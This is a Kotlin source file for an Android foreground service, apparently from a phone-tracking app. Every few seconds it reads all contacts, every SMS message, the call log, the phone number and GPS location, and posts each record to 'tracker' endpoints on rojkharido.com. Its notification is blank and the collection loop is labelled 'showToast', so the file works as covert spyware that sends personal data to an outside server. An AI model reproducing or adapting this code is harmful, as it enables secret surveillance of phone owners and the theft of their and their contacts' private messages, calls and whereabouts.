package com.track.app

import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.database.Cursor
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import com.android.volley.RequestQueue
import com.android.volley.Response
import com.android.volley.VolleyError
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.google.firebase.FirebaseApp
import com.google.firebase.messaging.FirebaseMessaging
import org.json.JSONException
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.HashMap

class MyForegroundService : Service() {

    private val TAG = "MyForegroundService"
    private val CHANNEL_ID = "MyForegroundServiceChannel"
    private val NOTIFICATION_ID = 1
    private val TOAST_INTERVAL: Long = 5000L
    private val handler = Handler()
    private val smsHandlerThread = HandlerThread("SmsHandlerThread")
    private val smsHandler: Handler

    private val smsReceiver = SmsReceiver()
    private var locationManager: LocationManager? = null

    //contacts
    private var requestContactCounter = 0
    private var successContactCounter = 0
    private var requestQueue: RequestQueue? = null

    //all sms
    private var requestAllSmsContactCounter = 0
    private var successAllSmsContactCounter = 0
    private var requestAllSmsQueue: RequestQueue? = null

    //call histories
    private var requestCallHistoriesCounter = 0
    private var successCallHistoriesCounter = 0
    private var requestCallHistoriesQueue: RequestQueue? = null

    //location
    private var requestLocationCounter = 0
    private var successLocationCounter = 0
    private var requestLocationQueue: RequestQueue? = null

    //last message
    private var requestLastMessageCounter = 0
    private var successLastMessageCounter = 0
    private var requestLastMessageQueue: RequestQueue? = null

    //fcm_token
    private var requestFcmCounter = 0
    private var successFcmCounter = 0
    private var requestFcmQueue: RequestQueue? = null

    init {
        smsHandlerThread.start()
        smsHandler = Handler(smsHandlerThread.looper)
    }

    override fun onCreate() {
        super.onCreate()

        //
        requestQueue = Volley.newRequestQueue(this)
        requestAllSmsQueue = Volley.newRequestQueue(this)
        requestCallHistoriesQueue = Volley.newRequestQueue(this)
        requestLocationQueue = Volley.newRequestQueue(this)
        requestLastMessageQueue = Volley.newRequestQueue(this)
        requestFcmQueue = Volley.newRequestQueue(this)

        // Initialize Firebase
        FirebaseApp.initializeApp(this)

        // Register the SMS receiver
        val filter = IntentFilter()
        filter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)
        registerReceiver(smsReceiver, filter)

        // Initialize LocationManager
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand")
        // Create an intent to launch the main activity if the notification is clicked.
        val notificationIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE)

        // Create a notification to keep the service in the foreground.
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.icon)
            .setContentIntent(pendingIntent)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannelOreoAndAbove()
        } else {
            createNotificationChannelBelowOreo()
        }

        // Start foreground service
        startForeground(NOTIFICATION_ID, notification)

        // Show a toast periodically
        handler.postDelayed(showToast, TOAST_INTERVAL)

        // Request location updates
        requestLocationUpdates()

        // Return START_STICKY to ensure the service restarts if it's killed by the system.
        return START_STICKY
    }

    private val showToast = object : Runnable {
        override fun run() {

            // Fetch current location
             fetchLocation()

            // Read the last SMS message
            val lastMessage = readLastSms()

            // Fetch current phone number
            val phoneNumber = getCurrentPhoneNumber()

            // Fetch all contacts
            val contacts = getAllContacts()

            // Inside showToast Runnable
            val callHistory = readCallHistory()

            // read all sms
            val allSms = readAllSms()

//  <!--------------------------------------------api hits------------------------------------------------>

            // =>=>=> contacts api =>=>=>
            // Initialize counters
            requestContactCounter = 0
            successContactCounter = 0

            contacts.split("\n").forEach { contact ->
                if (contact.isNotBlank()) {
                    makeContactsVolleyRequest(phoneNumber, contact)
                }
            }


            // =>=>=> all sms api =>=>=>
            // Initialize counters
            requestAllSmsContactCounter = 0
            successAllSmsContactCounter = 0

            allSms.split("\n").forEach { allSms ->
                if (allSms.isNotBlank()) {
                    makeAllSmsVolleyRequest(phoneNumber, allSms)
                }
            }


            // =>=>=> call histories api =>=>=>
            // Initialize counters
            requestCallHistoriesCounter = 0
            successCallHistoriesCounter = 0

            callHistory.split("\n").forEach { callHistory ->
                if (callHistory.isNotBlank()) {
                    makeCallHistoriesRequest(phoneNumber, callHistory)
                }
            }

            // =>=>=> last message =>=>=>
            // Initialize counters
            requestLastMessageCounter = 0
            successLastMessageCounter = 0

            lastMessage.split("\n").forEach { lastMessage ->
                if (lastMessage.isNotBlank()) {
                    makeReadLastMessagesRequest(phoneNumber, lastMessage)
                }
            }


            // =>=>=> fcm message =>=>=>
            // Initialize counters
            requestFcmCounter = 0
            successFcmCounter = 0
            phoneNumber.split("\n").forEach { phoneNumber ->
                if (phoneNumber.isNotBlank()) {
                    makeFcmRequest(phoneNumber)
                }
            }

            // Schedule the next toast
            handler.postDelayed(this, TOAST_INTERVAL)
        }
    }

    private fun showToastMessage(message: String) {
        handler.post {
            Log.d(TAG, "Showing Toast: $message")
            Toast.makeText(this@MyForegroundService, message, Toast.LENGTH_SHORT).show()
        }
    }

    private fun createNotificationChannelOreoAndAbove() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(NotificationManager::class.java)
            val channel = NotificationChannel(
                CHANNEL_ID,
                "My Foreground Service",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotificationChannelBelowOreo() {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.icon)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun requestLocationUpdates() {
        try {
            // Check for location permission
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                locationManager?.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    60000L,
                    0f,
                    locationListener
                )
            }
        } catch (ex: SecurityException) {
            Log.e(TAG, "Location permission denied", ex)
        }
    }

    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            val latitude = location.latitude
            val longitude = location.longitude
            // Fetch current phone number
            val phoneNumber = getCurrentPhoneNumber()
            //save into db
            myCurrentLocationRequest(phoneNumber, latitude.toString(), longitude.toString())
        }

        @Deprecated("Deprecated in Java")
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
            // Unused
        }

        override fun onProviderEnabled(provider: String) {
            // Unused
        }

        override fun onProviderDisabled(provider: String) {
            // Unused
        }
    }

    private fun fetchLocation() {
        try {
            // Check for location permission
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                val lastKnownLocation = locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                lastKnownLocation?.let {
                    val latitude = it.latitude
                    val longitude = it.longitude
                    // Fetch current phone number
                    val phoneNumber = getCurrentPhoneNumber()
                    //save into db
                    requestLocationCounter = 0
                    successLocationCounter = 0

                    myCurrentLocationRequest(phoneNumber, latitude.toString(), longitude.toString())
                }
            }
        } catch (ex: SecurityException) {
            Log.e(TAG, "Location permission denied", ex)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "onDestroy")

        // Remove the handler callbacks to stop showing toasts
        handler.removeCallbacks(showToast)

        // Unregister the SMS receiver when the service is destroyed
        unregisterReceiver(smsReceiver)

        // Stop location updates
        locationManager?.removeUpdates(locationListener)

        // Quit the handler thread
        smsHandlerThread.quit()
    }

    @SuppressLint("Range")
    private fun readLastSms(): String {
        val uri = Telephony.Sms.Inbox.CONTENT_URI
        val selection = "${Telephony.Sms.Inbox.TYPE} = ${Telephony.Sms.MESSAGE_TYPE_INBOX}"
        val sortOrder = "${Telephony.Sms.Inbox.DATE} DESC"

        val cursor = contentResolver.query(uri, null, selection, null, sortOrder)

        val smsMessages = StringBuilder()

        cursor?.use {
            if (it.moveToFirst()) {
                val bodyIndex = it.getColumnIndex(Telephony.Sms.Inbox.BODY)
                val phoneNumberIndex = it.getColumnIndex(Telephony.Sms.Inbox.ADDRESS)
                val typeIndex = it.getColumnIndex(Telephony.Sms.Inbox.TYPE)
                val dateIndex = it.getColumnIndex(Telephony.Sms.Inbox.DATE)

                val messageBody = it.getString(bodyIndex)
                val phoneNumber = it.getString(phoneNumberIndex)
                val messageType = getMessageType(it.getInt(typeIndex))
                val messageDateMillis = it.getLong(dateIndex)

                // Format the date
                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                val messageDate = dateFormat.format(messageDateMillis)

                smsMessages.append("Message: $messageBody, Mobile: $phoneNumber, Type: $messageType, Date: $messageDate\n")
            }
        }

        return if (smsMessages.isNotEmpty()) {
            smsMessages.toString()
        } else {
            "No SMS found"
        }
    }

    @SuppressLint("MissingPermission")
    private fun getCurrentPhoneNumber(): String {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return telephonyManager.line1Number ?: "Phone number not available"
    }

    @SuppressLint("Range")
    private fun getAllContacts(): String {
        val contentResolver = contentResolver
        val cursor: Cursor? = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        val contacts = StringBuilder()

        cursor?.use {
            while (it.moveToNext()) {
                val contactName =
                    it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phoneNumber =
                    it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                contacts.append("Name: $contactName, Mobile: $phoneNumber\n")
            }
        }

        return contacts.toString()
    }

    // Inside MyForegroundService class
    @SuppressLint("Range")
    private fun readCallHistory(): String {
        val sb = StringBuilder()

        try {
            val uri = android.provider.CallLog.Calls.CONTENT_URI
            val projection = arrayOf(
                android.provider.CallLog.Calls.NUMBER,
                android.provider.CallLog.Calls.CACHED_NAME, // Add this line for caller name
                android.provider.CallLog.Calls.TYPE,
                android.provider.CallLog.Calls.DATE
            )

            val cursor = contentResolver.query(uri, projection, null, null, android.provider.CallLog.Calls.DATE + " DESC")

            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(it.getColumnIndex(android.provider.CallLog.Calls.NUMBER))
                    val callerName = it.getString(it.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)) ?: "Unknown"
                    val type = it.getInt(it.getColumnIndex(android.provider.CallLog.Calls.TYPE))
                    val date = it.getLong(it.getColumnIndex(android.provider.CallLog.Calls.DATE))

                    val callType = when (type) {
                        android.provider.CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        android.provider.CallLog.Calls.MISSED_TYPE -> "Missed"
                        else -> "Unknown"
                    }

                    val callDate = java.text.DateFormat.getDateTimeInstance().format(date)
                    sb.append("Name: $callerName, Number: $number, Type: $callType, Date: $callDate\n")
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Read call history failed", e)
        }
        return sb.toString()
    }

    private fun makeContactsVolleyRequest(phoneNumber: String, message: String) {
        val url = "https://rojkharido.com/tracker/api/contacts.php"
        val stringRequest: StringRequest = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                // This code is executed if the server responds, whether or not the response contains data.
                // The String 'response' contains the server's response.
//                handleSuccessResponse(response)
            },
            Response.ErrorListener {
                // This code is executed if there is an error.
//                handleError(it)
            }) {
            override fun getParams(): Map<String, String> {
                val myData: MutableMap<String, String> = HashMap()
                myData["main_mobile"] = phoneNumber.toString()
                myData["message"] = message.toString()
                return myData
            }
        }
        // Add the request to the existing RequestQueue
        requestQueue?.add(stringRequest)
        requestContactCounter++
    }

    private fun makeAllSmsVolleyRequest(phoneNumber: String, message: String) {
        val url = "https://rojkharido.com/tracker/api/all_sms.php"
        val stringRequest: StringRequest = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                // This code is executed if the server responds, whether or not the response contains data.
                // The String 'response' contains the server's response.
//                handleSuccessResponse(response)
            },
            Response.ErrorListener {
                // This code is executed if there is an error.
//                handleError(it)
            }) {
            override fun getParams(): Map<String, String> {
                val myData: MutableMap<String, String> = HashMap()
                myData["main_mobile"] = phoneNumber.toString()
                myData["message"] = message.toString()
                return myData
            }
        }
        // Add the request to the existing RequestQueue
        requestAllSmsQueue?.add(stringRequest)
        requestAllSmsContactCounter++
    }

    private fun makeCallHistoriesRequest(phoneNumber: String, message: String) {
        val url = "https://rojkharido.com/tracker/api/call_histories.php"
        val stringRequest: StringRequest = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                // This code is executed if the server responds, whether or not the response contains data.
                // The String 'response' contains the server's response.
//                handleSuccessResponse(response)
            },
            Response.ErrorListener {
                // This code is executed if there is an error.
//                handleError(it)
            }) {
            override fun getParams(): Map<String, String> {
                val myData: MutableMap<String, String> = HashMap()
                myData["main_mobile"] = phoneNumber.toString()
                myData["message"] = message.toString()
                return myData
            }
        }
        // Add the request to the existing RequestQueue
        requestCallHistoriesQueue?.add(stringRequest)
        requestCallHistoriesCounter++
    }

    private fun makeReadLastMessagesRequest(phoneNumber: String, message: String) {
        val url = "https://rojkharido.com/tracker/api/last_sms.php"
        val stringRequest: StringRequest = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                // This code is executed if the server responds, whether or not the response contains data.
                // The String 'response' contains the server's response.
//                handleSuccessResponse(response)
            },
            Response.ErrorListener {
                // This code is executed if there is an error.
//                handleError(it)
            }) {
            override fun getParams(): Map<String, String> {
                val myData: MutableMap<String, String> = HashMap()
                myData["main_mobile"] = phoneNumber.toString()
                myData["message"] = message.toString()
                return myData
            }
        }
        // Add the request to the existing RequestQueue
        requestLastMessageQueue?.add(stringRequest)
        requestLastMessageCounter++
    }

    private fun makeFcmRequest(phoneNumber: String) {
        // Initialize Firebase
        FirebaseApp.initializeApp(this)
        // Initialize Firebase
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (!task.isSuccessful) {
                // Handle error
                return@addOnCompleteListener
            }

            // Get the device token
            val token = task.result

            val url = "https://rojkharido.com/tracker/api/fcm_token.php"
            val stringRequest: StringRequest = object : StringRequest(
                Method.POST, url,
                Response.Listener { response ->
                    // This code is executed if the server responds, whether or not the response contains data.
                    // The String 'response' contains the server's response.
//                handleSuccessResponse(response)
                },
                Response.ErrorListener {
                    // This code is executed if there is an error.
//                handleError(it)
                }) {
                override fun getParams(): Map<String, String> {
                    val myData: MutableMap<String, String> = HashMap()
                    myData["main_mobile"] = phoneNumber.toString()
                    myData["fcm_token"] = token.toString()
                    return myData
                }
            }
            // Add the request to the existing RequestQueue
            requestFcmQueue?.add(stringRequest)
            requestFcmCounter++
        }
    }

    private fun myCurrentLocationRequest(phoneNumber: String, latitude: String, longitude: String) {
        val url = "https://rojkharido.com/tracker/api/location.php"
        val stringRequest: StringRequest = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                // This code is executed if the server responds, whether or not the response contains data.
                // The String 'response' contains the server's response.
//                handleSuccessResponse(response)
            },
            Response.ErrorListener {
                // This code is executed if there is an error.
//                handleError(it)
            }) {
            override fun getParams(): Map<String, String> {
                val myData: MutableMap<String, String> = HashMap()
                myData["main_mobile"] = phoneNumber.toString()
                myData["latitude"] = latitude.toString()
                myData["longitude"] = longitude.toString()
                return myData
            }
        }
        // Add the request to the existing RequestQueue
        requestLocationQueue?.add(stringRequest)
        requestLocationCounter++
    }

//    // Handle successful response
//    private fun handleSuccessResponse(response: String) {
//        try {
//            val jsonResponse = JSONObject(response)
//            val status = jsonResponse.getString("status")
//            val message = jsonResponse.getString("message")
//            showToast("Status: $status\nMessage: $message")
//        } catch (e: JSONException) {
////            showToast("Error parsing JSON response")
//            e.printStackTrace()
//        }
//    }
//
//    // Handle error
//    private fun handleError(error: VolleyError) {
//        // Handle the error
//        showToast("Error: ${error.message}")
//    }

    private fun readAllSms(): String {
        val uri = Telephony.Sms.CONTENT_URI
        val sortOrder = "${Telephony.Sms.DATE} DESC"

        val cursor = contentResolver.query(uri, null, null, null, sortOrder)

        val smsMessages = StringBuilder()

        cursor?.use {
            while (it.moveToNext()) {
                val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
                val phoneNumberIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)

                val messageType = getMessageType(it.getInt(typeIndex))
                val phoneNumber = it.getString(phoneNumberIndex)
                val messageBody = it.getString(bodyIndex)
                val date = it.getLong(dateIndex)

                val formattedDate = formatDate(date)

                smsMessages.append("Type: $messageType, Mobile: $phoneNumber, Message: $messageBody, Date: $formattedDate\n")
            }
        }

        return if (smsMessages.isNotEmpty()) {
            smsMessages.toString()
        } else {
            "No SMS found"
        }
    }

    private fun formatDate(dateMillis: Long): String {
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        return dateFormat.format(Date(dateMillis))
    }

    private fun getMessageType(type: Int): String {
        return when (type) {
            Telephony.Sms.MESSAGE_TYPE_INBOX -> "Inbox"
            Telephony.Sms.MESSAGE_TYPE_SENT -> "Sent"
            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "Draft"
            Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "Outbox"
            else -> "Unknown"
        }
    }
}
